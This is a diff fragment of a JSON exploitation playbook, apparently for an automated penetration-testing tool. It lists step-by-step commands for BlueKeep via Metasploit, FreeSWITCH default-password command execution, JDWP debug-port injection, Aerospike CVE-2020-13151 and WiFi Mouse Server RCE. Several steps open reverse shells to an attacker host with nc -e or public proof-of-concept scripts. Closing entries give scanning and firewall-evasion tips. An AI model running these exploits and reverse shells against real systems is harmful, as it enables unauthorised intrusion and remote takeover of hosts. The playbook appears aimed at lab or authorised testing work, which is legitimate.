+          "tool": "msfconsole",
+          "run": "msfconsole -q -x \"use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOSTS {{target}}; set LHOST {{lhost}}; run\"",
+          "note": "Set the correct target arch and VM profile; the wrong one BSODs the host instead of landing a shell."
+        }
+      ]
+    },
+    {
+      "id": "freeswitch-esl",
+      "title": "FreeSWITCH Event Socket Command Execution (EDB-47799)",
+      "hypothesis": "FreeSWITCH is a VoIP server, and its event socket on port 8021 ships with the default password ClueCon and, too often, no access-control list. Any client that authenticates with that password can run operating-system commands through the API, so the exposed socket is a direct shell. On Windows it runs as the service account, which is frequently high-privilege. Confirm the default password is accepted, then issue a system command.",
+      "tool": "nc",
+      "tools": [
+        "nc",
+        "python"
+      ],
+      "os": [],
+      "phase": "access",
+      "requires_any": [
+        "port:8021",
+        "vuln.freeswitch"
+      ],
+      "produces": [
+        "foothold.linux",
+        "foothold.windows"
+      ],
+      "priority": 40,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "command execution through the FreeSWITCH event socket when the default password is accepted",
+      "does_not_prove": "anything when the socket requires a changed password or enforces an ACL",
+      "report": {
+        "finding": "FreeSWITCH event socket exposed with the default ClueCon password",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://www.exploit-db.com/exploits/47799"
+      ],
+      "commands": [
+        {
+          "tool": "nc",
+          "run": "printf 'auth ClueCon\\n\\napi status\\n\\n' | nc -nv {{target}} 8021",
+          "note": "A status reply means the default password is accepted and the socket is open to you."
+        },
+        {
+          "tool": "nc",
+          "run": "printf 'auth ClueCon\\n\\napi system whoami\\n\\n' | nc -nv {{target}} 8021",
+          "note": "The api system command runs an OS command; whoami confirms the execution context."
+        },
+        {
+          "tool": "python",
+          "run": "python3 47799.py {{target}} 'nc {{lhost}} 4444 -e /bin/sh'",
+          "note": "The PoC wraps auth and a reverse shell; start nc -lvnp 4444 first."
+        }
+      ]
+    },
+    {
+      "id": "jdwp-debug",
+      "title": "JDWP Java Debug Port RCE",
+      "hypothesis": "The Java Debug Wire Protocol is meant for a developer to attach a debugger, and anyone who can reach the port can do the same, which includes invoking methods. That means code execution as the user running the JVM. The port is often bound to localhost, so you usually reach it through a pivot. Confirm it with the JDWP handshake, then a tool invokes a command inside the running Java process.",
+      "tool": "nc",
+      "tools": [
+        "nc",
+        "python",
+        "git"
+      ],
+      "os": [],
+      "phase": "access",
+      "requires_any": [
+        "port:8000",
+        "port:8787",
+        "port:5005",
+        "vuln.jdwp"
+      ],
+      "produces": [
+        "foothold.linux"
+      ],
+      "priority": 40,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "code execution in the JVM context through an exposed Java debug port",
+      "does_not_prove": "anything unless the port speaks JDWP and you can reach it, often only via a pivot",
+      "report": {
+        "finding": "Exposed JDWP debug port allows code execution in the JVM",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://github.com/IOActive/jdwp-shellifier"
+      ],
+      "commands": [
+        {
+          "tool": "nc",
+          "run": "(printf 'JDWP-Handshake'; sleep 1) | nc -nv {{target}} 8000",
+          "note": "An echoed JDWP-Handshake confirms a live debug port."
+        },
+        {
+          "tool": "git",
+          "run": "git clone https://github.com/IOActive/jdwp-shellifier",
+          "note": "jdwp-shellifier injects a command into the running JVM; it needs python2."
+        },
+        {
+          "tool": "python",
+          "run": "python2 jdwp-shellifier.py -t {{target}} -p 8000 --cmd 'busybox nc {{lhost}} 4444 -e /bin/bash'",
+          "note": "Runs as the JVM user; if JDWP is bound to localhost, reach it through a chisel or ligolo pivot. Start nc -lvnp 4444 first."
+        }
+      ]
+    },
+    {
+      "id": "aerospike-udf",
+      "title": "Aerospike UDF Command Execution (CVE-2020-13151)",
+      "hypothesis": "Aerospike is a database, and versions up to 5.1.0.6 let an unauthenticated client register a user-defined Lua function that runs operating-system commands as the aerospike service user. The service listens on 3000 to 3003, and a web app often names Aerospike as its backend, which is how you spot it. Reach the port, run the public proof of concept to register the malicious UDF, and catch a shell.",
+      "tool": "nc",
+      "tools": [
+        "nc",
+        "python",
+        "git"
+      ],
+      "os": [
+        "linux"
+      ],
+      "phase": "access",
+      "requires_any": [
+        "port:3000",
+        "vuln.aerospike"
+      ],
+      "produces": [
+        "foothold.linux"
+      ],
+      "priority": 40,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "command execution as the aerospike user via an attacker-registered Lua UDF",
+      "does_not_prove": "anything on Aerospike above 5.1.0.6, where the UDF path is restricted",
+      "report": {
+        "finding": "Aerospike unauthenticated Lua UDF command execution",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2020-13151",
+        "https://github.com/b4ny4n/CVE-2020-13151"
+      ],
+      "commands": [
+        {
+          "tool": "nc",
+          "run": "nc -nv {{target}} 3000",
+          "note": "Aerospike speaks its info protocol on 3000 to 3003; a banner confirms the service."
+        },
+        {
+          "tool": "git",
+          "run": "git clone https://github.com/b4ny4n/CVE-2020-13151",
+          "note": "The PoC registers a Lua UDF that executes your command."
+        },
+        {
+          "tool": "python",
+          "run": "python3 aerospike_UDF_RCE.py --ahost {{target}} --aport 3000 --lhost {{lhost}} --lport 4444 --command rev",
+          "note": "Start nc -lvnp 4444 first; the UDF runs as the aerospike user."
+        }
+      ]
+    },
+    {
+      "id": "wifi-mouse-rce",
+      "title": "WiFi Mouse Server Unauthenticated RCE (EDB-50972)",
+      "hypothesis": "WiFi Mouse turns a phone into a mouse and keyboard for a PC, and its Mouse Server on port 1978 checks the client is authorised only on the client side, which an attacker simply skips. So file-execution events can be sent with no authentication and run a program as the logged-in desktop user. Confirm the port, then the public proof of concept drops and runs a reverse shell.",
+      "tool": "nc",
+      "tools": [
+        "nc",
+        "python"
+      ],
+      "os": [
+        "windows"
+      ],
+      "phase": "access",
+      "requires_any": [
+        "port:1978",
+        "vuln.wifi_mouse"
+      ],
+      "produces": [
+        "foothold.windows"
+      ],
+      "priority": 40,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "command execution as the desktop user through the client-side-only Mouse Server auth",
+      "does_not_prove": "anything if the Mouse Server is not the vulnerable build or the port is closed",
+      "report": {
+        "finding": "WiFi Mouse Server client-side-only authentication allows unauthenticated RCE",
+        "severity": "high"
+      },
+      "refs": [
+        "https://www.exploit-db.com/exploits/50972"
+      ],
+      "commands": [
+        {
+          "tool": "nc",
+          "run": "nc -nv {{target}} 1978",
+          "note": "The Mouse Server control port answering confirms the target app is present."
+        },
+        {
+          "tool": "python",
+          "run": "python3 50972.py {{target}} {{lhost}} 4444",
+          "note": "The PoC sends unauthenticated file-exec events to run a reverse shell; start nc -lvnp 4444 first."
+        }
+      ]
+    },
+    {
+      "id": "nmap-host-unresponsive",
+      "title": "Nmap Says Host Is Down \u2014 Make It Answer",
+      "tool": "nmap",
+      "tools": [
+        "nmap"
+      ],
+      "os": [
+        "linux",
+        "windows"
+      ],
+      "requires_all": [
+        "blocker.host_down"
+      ],
+      "produces": [
+        "ports.open"
+      ],
+      "priority": 95,
+      "hypothesis": "\"Host seems down\" almost never means down - it means the box drops the ICMP ping nmap uses to decide a host is alive. Skip the ping with -Pn and it answers. This is the single most common reason a beginner thinks a live target is dead. While here, remember UDP and filtered-TCP need their own scan types.",
+      "proves": "the real open-port surface once host discovery is taken out of nmap's way",
+      "does_not_prove": "that nothing is filtered; a firewall can still drop specific probes",
+      "report": {
+        "finding": "Host alive behind ICMP filtering",
+        "severity": "info"
+      },
+      "commands": [
+        {
+          "tool": "nmap",
+          "run": "nmap -Pn -p- --min-rate 5000 {{target}}",
+          "note": "-Pn = treat the host as up, skip ping. This is the fix 90% of the time."
+        },
+        {
+          "tool": "nmap",
+          "run": "nmap -Pn -sU --top-ports 50 {{target}}",
+          "note": "If TCP is bare, the service may be UDP (SNMP/TFTP/IKE/DNS). -sU scans it (slow; top-ports keeps it sane)."
+        },
+        {
+          "tool": "nmap",
+          "run": "nmap -Pn -sT --source-port 53 {{target}}",
+          "note": "If SYN scans are filtered, a full-connect scan (-sT) or a trusted source port (53/443) can slip past a stateless firewall."
+        }
+      ]
+    },
+    {
+      "id": "fix-name-resolution",
+      "title": "Could Not Resolve Host \u2014 Add It to /etc/hosts",
+      "tool": "sh",
+      "tools": [
+        "sh"
+      ],
+      "os": [
+        "linux",
+        "windows"
+      ],
+      "requires_all": [
+        "blocker.name_resolution"
+      ],
+      "produces": [
+        "advice.hosts"
+      ],
+      "priority": 94,
+      "hypothesis": "\"Could not resolve host\" means a tool was handed a name (box.htb, dc01.corp.local) with nothing to resolve it. Map the name to the IP in /etc/hosts and everything that failed just works - and many web apps and all of Kerberos REQUIRE the name, not the IP, so this unblocks virtual hosts and TGT requests at the same time.",
+      "proves": "nothing attack-wise; it makes name-addressed tools and vhosts reachable",
+      "does_not_prove": "that the name is the only vhost; enumerate others once resolution works",
+      "report": {
+        "finding": "Hostname mapping required (/etc/hosts)",
+        "severity": "info"
+      },
+      "commands": [
+        {
+          "tool": "sh",
+          "run": "echo '{{target}} {{hostname}} {{domain}}' | sudo tee -a /etc/hosts",
+          "note": "Map the IP to the name(s) the app/DC uses. Read the names from TLS certs, redirects, LDAP, or SMB. Re-run the command that failed."
+        },
+        {
+          "tool": "sh",
+          "run": "curl -s -H 'Host: {{hostname}}' http://{{target}}/",
+          "note": "If a name resolves but the site shows a default page, it is virtual-host routed: the real site only answers to the right Host header \u2014 feed that name to vhost/content discovery."
+        }
       ]
     }
   ]
